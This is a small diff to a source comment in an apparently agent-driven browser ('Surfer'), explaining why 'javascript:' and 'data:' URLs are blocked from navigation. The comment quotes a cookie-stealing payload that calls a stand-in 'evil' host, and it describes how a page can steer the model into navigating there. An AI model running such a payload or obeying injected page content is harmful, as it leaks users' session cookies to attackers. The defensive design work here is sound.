@@ -8,7 +8,7 @@
 //
 // THE SECURITY CASE: `javascript:` and `data:` must never be navigable.
 //
-// Browser exposes `navigate` as an Agent Bus tool, so a URL can arrive
+// Surfer exposes `navigate` as an Agent Bus tool, so a URL can arrive
 // from the model — and a model can be steered by a page it just read.
 // `javascript:fetch('https://evil/'+document.cookie)` in the address bar
 // executes in the context of the CURRENT page, which is how a navigation
